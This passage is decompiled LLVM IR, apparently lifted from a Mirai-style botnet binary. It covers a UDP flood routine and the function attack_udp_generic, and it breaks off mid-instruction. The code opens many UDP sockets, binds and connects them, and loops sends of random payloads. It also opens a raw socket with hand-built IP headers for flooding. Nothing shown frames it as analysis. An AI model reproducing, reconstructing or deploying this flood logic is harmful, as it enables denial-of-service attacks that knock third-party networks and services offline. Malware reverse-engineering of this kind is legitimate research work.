  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_b608 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b624 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_b624, i32* @sl, align 4
  %v0_b630 = load i32, i32* @r7, align 4
  %v2_b634 = call i32 @calloc(i32 %v0_b630, i32 4)
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  %v0_b640 = load i32, i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 %v2_b634, i32* @r8, align 4
  %v0_b650 = load i32, i32* @r5, align 4
  %v5_b654 = inttoptr i32 %v0_b640 to i32*
  %v6_b654 = call i32 @attack_get_opt_int(i32 %v0_b650, i32* %v5_b654, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v3_b65c = urem i32 %v6_b654, 65536
  %v0_b660 = load i32, i32* @r6, align 4
  %v0_b668 = load i32, i32* @r4, align 4
  store i32 %v0_b668, i32* %r3.global-to-local, align 4
  %v0_b66c = load i32, i32* @r5, align 4
  %v5_b674 = inttoptr i32 %v0_b660 to i32*
  %v6_b674 = call i32 @attack_get_opt_int(i32 %v0_b66c, i32* %v5_b674, i32 6, i32 %v0_b668, i32 %v3_b65c)
  %v0_b678 = load i32, i32* @r6, align 4
  %v3_b67c = mul i32 %v6_b674, 65536
  store i32 %v3_b67c, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_b688 = load i32, i32* @r5, align 4
  %v5_b68c = inttoptr i32 %v0_b678 to i32*
  %v6_b68c = call i32 @attack_get_opt_int(i32 %v0_b688, i32* %v5_b68c, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b69c = load i32, i32* @r6, align 4
  %v0_b6a0 = load i32, i32* @r5, align 4
  %v3_b6a4 = urem i32 %v6_b68c, 65536
  store i32 %v3_b6a4, i32* @r5, align 4
  %v5_b6a8 = inttoptr i32 %v0_b69c to i32*
  %v6_b6a8 = call i32 @attack_get_opt_int(i32 %v0_b6a0, i32* %v5_b6a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_b6ac = load i32, i32* %sb.global-to-local, align 4
  %v3_b6ac = udiv i32 %v0_b6ac, 65536
  store i32 %v3_b6ac, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b6b4 = load i32, i32* @r4, align 4
  %v9_b6b4 = icmp eq i32 %v3_b6ac, %v1_b6b4
  br i1 %v9_b6b4, label %dec_label_pc_b6e4, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_b6cc = udiv i32 %v0_b6ac, 16777216
  store i32 %v4_b6cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6f4

dec_label_pc_b6e4:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_b6e4 = call i32 @rand_next()
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %bb, %dec_label_pc_b6e4
  %v0_b6d810 = urem i32 %v6_b6a8, 256
  %v0_b6f4 = load i32, i32* @r7, align 4
  %v2_b6f4 = icmp eq i32 %v0_b6f4, 0
  br i1 %v2_b6f4, label %dec_label_pc_b834, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6f4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_b7a8 = udiv i32 %v3_b65c, 256
  %v1_b7a4 = mul i32 %v6_b654, 256
  %v4_b7ac = and i32 %v1_b7a4, 65280
  %v5_b7ac = or i32 %v4_b7ac, %v3_b7a8
  %v2_b72c = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_b78c

dec_label_pc_b70c:                                ; preds = %bb51, %dec_label_pc_b7cc
  %v3_b718 = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_b720 = icmp eq i32 %v3_b718, -1
  %v0_b724 = load i32, i32* @sb, align 4
  %v1_b724 = add i32 %v0_b724, 1
  store i32 %v1_b724, i32* @sb, align 4
  %v0_b728 = load i32, i32* @fp, align 4
  %v1_b728 = add i32 %v0_b728, 24
  store i32 %v1_b728, i32* @fp, align 4
  %v2_b734 = load i32, i32* @r8, align 4
  %v3_b734 = add i32 %v2_b734, %stack_var_-60.0
  %v4_b734 = inttoptr i32 %v3_b734 to i32*
  store i32 %v3_b718, i32* %v4_b734, align 4
  br i1 %v7_b720, label %dec_label_pc_b828, label %dec_label_pc_b73c

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b70c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_b754 = call i32 @bind(i32 %v3_b718, i32 %v2_b72c, i32 16)
  %v0_b758 = load i32, i32* @r6, align 4
  %v1_b758 = add i32 %v0_b758, 20
  %v2_b758 = inttoptr i32 %v1_b758 to i8*
  %v3_b758 = load i8, i8* %v2_b758, align 1
  %v4_b758 = zext i8 %v3_b758 to i32
  store i32 %v4_b758, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_b758, 32
  br i1 %tmp, label %dec_label_pc_b7e0, label %dec_label_pc_b764

dec_label_pc_b764:                                ; preds = %dec_label_pc_b73c, %dec_label_pc_b7e0
  %v0_b768 = phi i32 [ %v0_b758, %dec_label_pc_b73c ], [ %v0_b768.pre, %dec_label_pc_b7e0 ]
  %v1_b76c = load i32, i32* @r8, align 4
  %v2_b76c = add i32 %v1_b76c, %stack_var_-60.0
  %v3_b76c = inttoptr i32 %v2_b76c to i32*
  %v4_b76c = load i32, i32* %v3_b76c, align 4
  %v3_b774 = call i32 @__libc_connect(i32 %v4_b76c, i32 %v0_b768, i32 16)
  %v0_b77c = load i32, i32* @sb, align 4
  %v1_b77c = load i32, i32* @r7, align 4
  %v9_b77c = icmp eq i32 %v0_b77c, %v1_b77c
  %v1_b780 = add i32 %stack_var_-60.0, 4
  store i32 %v1_b780, i32* %r3.global-to-local, align 4
  br i1 %v9_b77c, label %dec_label_pc_b834, label %dec_label_pc_b78c

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6fc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b6fc ], [ %v1_b780, %dec_label_pc_b764 ]
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  %v2_b79c = call i32 @calloc(i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 1)
  store i32 %v5_b7ac, i32* %r3.global-to-local, align 4
  %v1_b7b8 = load i32, i32* @r4, align 4
  %v9_b7b8 = icmp eq i32 %v3_b65c, %v1_b7b8
  %v1_b7bc = load i32, i32* @fp, align 4
  %v2_b7bc = add i32 %v1_b7bc, %arg2
  store i32 %v2_b7bc, i32* @r6, align 4
  %v2_b7c0 = load i32, i32* @sl, align 4
  %v3_b7c0 = add i32 %v2_b7c0, %stack_var_-60.0
  %v4_b7c0 = inttoptr i32 %v3_b7c0 to i32*
  store i32 %v2_b79c, i32* %v4_b7c0, align 4
  br i1 %v9_b7b8, label %dec_label_pc_b7cc, label %bb51

bb51:                                             ; preds = %dec_label_pc_b78c
  %v1_b7c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b7c4 = trunc i32 %v1_b7c4 to i16
  %v3_b7c4 = load i32, i32* @r6, align 4
  %v4_b7c4 = add i32 %v3_b7c4, 2
  %v5_b7c4 = inttoptr i32 %v4_b7c4 to i16*
  store i16 %v2_b7c4, i16* %v5_b7c4, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7cc:                                ; preds = %dec_label_pc_b78c
  %v0_b7cc = call i32 @rand_next()
  %v1_b7cc = trunc i32 %v0_b7cc to i16
  %v0_b7d4 = load i32, i32* @fp, align 4
  %v2_b7d4 = add i32 %v0_b7d4, %arg2
  store i32 %v2_b7d4, i32* @r6, align 4
  %v4_b7d8 = add i32 %v2_b7d4, 2
  %v5_b7d8 = inttoptr i32 %v4_b7d8 to i16*
  store i16 %v1_b7cc, i16* %v5_b7d8, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b73c
  %v1_b7e0 = add i32 %v0_b758, 16
  %v2_b7e0 = inttoptr i32 %v1_b7e0 to i32*
  %v3_b7e0 = load i32, i32* %v2_b7e0, align 4
  store i32 %v3_b7e0, i32* @r4, align 4
  %v0_b7e4 = call i32 @rand_next()
  %v0_b7e8 = load i32, i32* @r4, align 4
  %v1_b7f4 = and i32 %v0_b7e8, 65280
  store i32 %v1_b7f4, i32* %r3.global-to-local, align 4
  %v0_b7fc = load i32, i32* @r6, align 4
  %v1_b7fc = add i32 %v0_b7fc, 20
  %v2_b7fc = inttoptr i32 %v1_b7fc to i8*
  %v3_b7fc = load i8, i8* %v2_b7fc, align 1
  %v4_b7fc = zext i8 %v3_b7fc to i32
  %v5_b800 = call i32 @llvm.bswap.i32(i32 %v0_b7e8)
  %v7_b804 = lshr i32 %v0_b7e4, %v4_b7fc
  %v8_b804 = add i32 %v7_b804, %v5_b800
  %v5_b81c = call i32 @llvm.bswap.i32(i32 %v8_b804)
  store i32 %v5_b81c, i32* %r3.global-to-local, align 4
  %v2_b820 = add i32 %v0_b7fc, 4
  %v3_b820 = inttoptr i32 %v2_b820 to i32*
  store i32 %v5_b81c, i32* %v3_b820, align 4
  %v0_b768.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b764

dec_label_pc_b828:                                ; preds = %dec_label_pc_b70c
  store i32 %v18_b608, i32* %sb.global-to-local, align 4
  ret i32 %v3_b718

dec_label_pc_b834:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6f4
  %v1_b87422 = phi i32 [ 0, %dec_label_pc_b6f4 ], [ %v0_b77c, %dec_label_pc_b764 ]
  %v2_b838 = icmp eq i32 %v0_b6d810, 0
  br i1 %v2_b838, label %dec_label_pc_b858.outer, label %dec_label_pc_b870

dec_label_pc_b848:                                ; preds = %dec_label_pc_b858
  store i32 %v1_b84c, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b848 = load i32, i32* @r8, align 4
  %v4_b848 = mul i32 %v1_b84c, 4
  %v5_b848 = add i32 %v0_b848, %v4_b848
  %v6_b848 = inttoptr i32 %v5_b848 to i32*
  %v7_b848 = load i32, i32* %v6_b848, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  %v5_b84c = add i32 %v0_b84c, %v4_b848
  %v6_b84c = inttoptr i32 %v5_b84c to i32*
  %v7_b84c = load i32, i32* %v6_b84c, align 4
  %v4_b850 = call i32 @__libc_send(i32 %v7_b848, i32 %v7_b84c, i32 %v0_b85c, i32 16384)
  %v0_b854 = load i32, i32* @r4, align 4
  %v1_b854 = add i32 %v0_b854, 1
  %v0_b858.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b858.outer

dec_label_pc_b858.outer:                          ; preds = %dec_label_pc_b834, %dec_label_pc_b848
  %v0_b858.ph = phi i32 [ %v0_b858.pre.pre, %dec_label_pc_b848 ], [ %v1_b87422, %dec_label_pc_b834 ]
  %v1_b84c.ph = phi i32 [ %v1_b854, %dec_label_pc_b848 ], [ 0, %dec_label_pc_b834 ]
  %v0_b85c = load i32, i32* @r5, align 4
  br label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b858.outer, %dec_label_pc_b858
  %v1_b84c = phi i32 [ 0, %dec_label_pc_b858 ], [ %v1_b84c.ph, %dec_label_pc_b858.outer ]
  %v8_b864 = icmp sgt i32 %v0_b858.ph, %v1_b84c
  br i1 %v8_b864, label %dec_label_pc_b848, label %dec_label_pc_b858

dec_label_pc_b870:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b834
  %v1_b87421 = phi i32 [ %v1_b87422, %dec_label_pc_b834 ], [ %v1_b874, %dec_label_pc_b874 ]
  br label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b880, %dec_label_pc_b870
  %v1_b874 = phi i32 [ %v1_b87421, %dec_label_pc_b870 ], [ %v1_b874.pre, %dec_label_pc_b880 ]
  %v1_b880 = phi i32 [ 0, %dec_label_pc_b870 ], [ %v1_b8a0, %dec_label_pc_b880 ]
  store i32 %v1_b880, i32* @r6, align 4
  %v6_b87c = icmp slt i32 %v1_b880, %v1_b874
  br i1 %v6_b87c, label %dec_label_pc_b880, label %dec_label_pc_b870

dec_label_pc_b880:                                ; preds = %dec_label_pc_b874
  %v0_b878 = load i32, i32* @r5, align 4
  %v0_b880 = load i32, i32* @sl, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v0_b880, %v4_b880
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r4, align 4
  %v2_b888 = inttoptr i32 %v7_b880 to i16*
  %v3_b888 = call i32 @rand_str(i16* %v2_b888, i32 %v0_b878)
  %v0_b88c = load i32, i32* @r8, align 4
  %v1_b88c = load i32, i32* @r6, align 4
  %v4_b88c = mul i32 %v1_b88c, 4
  %v5_b88c = add i32 %v4_b88c, %v0_b88c
  %v6_b88c = inttoptr i32 %v5_b88c to i32*
  %v7_b88c = load i32, i32* %v6_b88c, align 4
  %v0_b890 = load i32, i32* @r4, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_b89c = call i32 @__libc_send(i32 %v7_b88c, i32 %v0_b890, i32 %v0_b894, i32 16384)
  %v0_b8a0 = load i32, i32* @r6, align 4
  %v1_b8a0 = add i32 %v0_b8a0, 1
  %v1_b874.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b874

; uselistorder directives
  uselistorder i32 %v1_b874, { 1, 0 }
  uselistorder i32 %v1_b84c, { 2, 1, 0 }
  uselistorder i32 %v5_b81c, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b718, { 1, 3, 2, 0 }
  uselistorder i32 %v3_b6ac, { 1, 0 }
  uselistorder i32 %v3_b65c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 15, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b858, { 1, 0 }
  uselistorder label %dec_label_pc_b858.outer, { 1, 0 }
  uselistorder label %dec_label_pc_b764, { 1, 0 }
  uselistorder label %dec_label_pc_b70c, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_b8a8 = load i32, i32* @sb, align 4
  %v27_b8a8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b8c4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_b8c8 = load i32, i32* @r5, align 4
  store i32 %v0_b8c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v5_b8dc = inttoptr i32 %v0_b8c8 to i32*
  %v6_b8dc = call i32 @attack_get_opt_int(i32 %v0_b8d8, i32* %v5_b8dc, i32 2, i32 0, i32 %v2_b8c4)
  %v1_b8e8 = urem i32 %v6_b8dc, 256
  store i32 %v1_b8e8, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r5, align 4
  store i32 %v0_b8f4, i32* %r1.global-to-local, align 4
  %v0_b8f8 = load i32, i32* @r4, align 4
  store i32 %v0_b8f8, i32* %r0.global-to-local, align 4
  %v5_b8fc = trunc i32 %v6_b8dc to i8
  %v6_b900 = inttoptr i32 %v0_b8f4 to i32*
  %v7_b900 = call i32 @attack_get_opt_int(i32 %v0_b8f8, i32* %v6_b900, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_b8dc)
  %v0_b904 = load i32, i32* @r5, align 4
  store i32 %v0_b904, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v5_b918 = inttoptr i32 %v0_b904 to i32*
  %v6_b918 = call i32 @attack_get_opt_int(i32 %v0_b914, i32* %v5_b918, i32 4, i32 64, i32 %v7_b900)
  %v1_b920 = urem i32 %v6_b918, 256
  store i32 %v1_b920, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r5, align 4
  store i32 %v0_b924, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b930 = load i32, i32* @r4, align 4
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  %v6_b938 = inttoptr i32 %v0_b924 to i32*
  %v7_b938 = call i32 @attack_get_opt_int(i32 %v0_b930, i32* %v6_b938, i32 5, i32 0, i32 %v1_b920)
  %v1_b944 = urem i32 %v7_b938, 256
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b950 = load i32, i32* @r5, align 4
  store i32 %v0_b950, i32* %r1.global-to-local, align 4
  %v0_b954 = load i32, i32* @r4, align 4
  store i32 %v0_b954, i32* %r0.global-to-local, align 4
  %v5_b95c = inttoptr i32 %v0_b950 to i32*
  %v6_b95c = call i32 @attack_get_opt_int(i32 %v0_b954, i32* %v5_b95c, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_b944)
  %v0_b964 = load i32, i32* @r5, align 4
  store i32 %v0_b964, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b95c, i32* %sb.global-to-local, align 4
  %v0_b974 = load i32, i32* @r4, align 4
  store i32 %v0_b974, i32* %r0.global-to-local, align 4
  %v5_b978 = inttoptr i32 %v0_b964 to i32*
  %v6_b978 = call i32 @attack_get_opt_int(i32 %v0_b974, i32* %v5_b978, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_b97c = load i32, i32* @r5, align 4
  store i32 %v0_b97c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_b978, i32* @sl, align 4
  %v0_b98c = load i32, i32* @r4, align 4
  store i32 %v0_b98c, i32* %r0.global-to-local, align 4
  %v5_b990 = inttoptr i32 %v0_b97c to i32*
  %v6_b990 = call i32 @attack_get_opt_int(i32 %v0_b98c, i32* %v5_b990, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b99c = load i32, i32* @r5, align 4
  store i32 %v0_b99c, i32* %r1.global-to-local, align 4
  store i32 %v6_b990, i32* @r6, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v5_b9a8 = inttoptr i32 %v0_b99c to i32*
  %v6_b9a8 = call i32 @attack_get_opt_int(i32 %v0_b9a4, i32* %v5_b9a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_b9b4 = load i32, i32* @global_var_24f80.59, align 4
  store i32 %v2_b9b4, i32* %r3.global-to-local, align 4
  %v1_b9b8 = urem i32 %v6_b9a8, 256
  store i32 %v1_b9b8, i32* %ip.global-to-local, align 4
  %v0_b9bc = load i32, i32* @r5, align 4
  store i32 %v0_b9bc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i32, i32* @r4, align 4
  store i32 %v0_b9c4, i32* %r0.global-to-local, align 4
  %v5_b9cc = inttoptr i32 %v0_b9bc to i32*
  %v6_b9cc = call i32 @attack_get_opt_int(i32 %v0_b9c4, i32* %v5_b9cc, i32 25, i32 %v2_b9b4, i32 %v1_b9b8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b9e0 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_b9e0, i32* %r0.global-to-local, align 4
  %v7_b9e4 = icmp eq i32 %v3_b9e0, -1
  store i1 %v7_b9e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b9e0, i32* @fp, align 4
  br i1 %v7_b9e4, label %dec_label_pc_bd84, label %dec_label_pc_b9f0

dec_label_pc_b9f0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b9f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b9f8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ba0c = call i32 @__GI_setsockopt(i32 %v3_b9e0, i32 0, i32 3, i32 %v6_b9f8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ba0c, i32* %r0.global-to-local, align 4
  %v7_ba10 = icmp eq i32 %v5_ba0c, -1
  store i1 %v7_ba10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba10, label %dec_label_pc_bd7c, label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9f0
  %v0_ba18 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ba24 = urem i32 %v0_ba18, 65536
  store i32 %v3_ba24, i32* %r2.global-to-local, align 4
  %v3_ba28 = icmp ugt i32 %v3_ba24, 1459
  %v9_ba28 = icmp eq i32 %v3_ba24, 1460
  store i1 %v9_ba28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ba28, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_ba18
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ba18, %bb
  %v0_ba84 = phi i32 [ %v3_ba24, %dec_label_pc_ba18 ], [ 1460, %bb ]
  store i32 %v7_b900, i32* %r0.global-to-local, align 4
  %v0_ba34 = load i32, i32* %sb.global-to-local, align 4
  %v3_ba3c = urem i32 %v0_ba34, 65536
  store i32 %v3_ba3c, i32* %ip.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r7, align 4
  %v2_ba40 = icmp eq i32 %v0_ba40, 0
  store i1 %v2_ba40, i1* %cpsr_z.global-to-local, align 1
  %v0_ba44 = load i32, i32* @sl, align 4
  %v3_ba44 = mul i32 %v0_ba44, 65536
  br i1 %v2_ba40, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ba84, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ba74 = phi i32 [ %v3_ba3c, %bb48 ], [ %v0_ba84, %bb49 ]
  %v3_ba54 = urem i32 %v0_ba44, 65536
  store i32 %v3_ba54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ba5c = urem i32 %v7_b900, 65536
  store i32 %v3_ba5c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba40, label %.thread, label %dec_label_pc_ba7c

.thread:                                          ; preds = %bb50
  %v2_ba70 = add nsw i32 %v1_ba74, 28
  store i32 %v2_ba70, i32* @sb, align 4
  %v2_ba74 = add nsw i32 %v1_ba74, 8
  store i32 %v2_ba74, i32* @sl, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_ba7c:                                ; preds = %bb50
  %v1_ba84 = add nuw nsw i32 %v0_ba84, 28
  store i32 %v1_ba84, i32* @sb, align 4
  %v1_ba88 = add nuw nsw i32 %v0_ba84, 8
  store i32 %v1_ba88, i32* @sl, align 4
  %tmp51 = mul i32 %v0_ba34, 256
  %v3_ba9c = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_ba34, 256
  %v4_baac = urem i32 %tmp52, 256
  %v5_baac = or i32 %v4_baac, %v3_ba9c
  store i32 %v5_baac, i32* @r6, align 4
  store i32 %v3_ba44, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ba84, 256
  %v3_bab8 = and i32 %tmp53, 65280
  store i32 %v3_bab8, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ba44, 256
  %v3_babc = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ba88, 256
  %v3_bac0 = and i32 %tmp55, 65280
  store i32 %v3_bac0, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ba84, 256
  %v4_bac4 = urem i32 %tmp56, 256
  %v5_bac4 = or i32 %v4_bac4, %v3_bab8
  store i32 %v5_bac4, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ba44, 256
  %v4_bac8 = urem i32 %tmp57, 256
  %v5_bac8 = or i32 %v4_bac8, %v3_babc
  store i32 %v5_bac8, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ba88 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_b900, 256
  %v3_bad0 = and i32 %tmp58, 65280
  store i32 %v3_bad0, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_b900, 256
  %v4_bae0 = urem i32 %tmp59, 256
  %v5_bae0 = or i32 %v4_bae0, %v3_bad0
  store i32 %v5_bae0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_bac4, 65536
  %v4_bb54 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_bac8, 65536
  %v7_bb88 = sdiv i32 %sext6, 65536
  %v1_bb48 = trunc i32 %v6_b918 to i8
  %v3_bb88 = sext i16 %rev to i32
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %.thread8, %dec_label_pc_ba7c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_baf4 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_baf4, i32* %r0.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r3.global-to-local, align 4
  %v3_bafc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bafc, i32* %r1.global-to-local, align 4
  %v2_bb00 = load i32, i32* @r4, align 4
  %v5_bb00 = mul i32 %v2_bb00, 4
  %v6_bb00 = add i32 %v5_bb00, %v2_b8c4
  %v7_bb00 = inttoptr i32 %v6_bb00 to i32*
  store i32 %v2_baf4, i32* %v7_bb00, align 4
  %v0_bb04 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb04 = load i32, i32* %r1.global-to-local, align 4
  %v4_bb04 = mul i32 %v1_bb04, 4
  %v5_bb04 = add i32 %v4_bb04, %v0_bb04
  %v6_bb04 = inttoptr i32 %v5_bb04 to i32*
  %v7_bb04 = load i32, i32* %v6_bb04, align 4
  store i32 %v7_bb04, i32* %r0.global-to-local, align 4
  %v1_bb08 = inttoptr i32 %v7_bb04 to i8*
  %v2_bb08 = load i8, i8* %v1_bb08, align 1
  %tmp = urem i8 %v2_bb08, 16
  %v1_bb0c = zext i8 %tmp to i32
  %v1_bb10 = or i32 %v1_bb0c, 64
  store i32 %v1_bb10, i32* %r3.global-to-local, align 4
  %v1_bb14 = trunc i32 %v1_bb10 to i8
  store i8 %v1_bb14, i8* %v1_bb08, align 1
  %v0_bb18 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb18 = inttoptr i32 %v0_bb18 to i8*
  %v2_bb18 = load i8, i8* %v1_bb18, align 1
  %v1_bb1c = and i8 %v2_bb18, -16
  %v1_bb20 = or i8 %v1_bb1c, 5
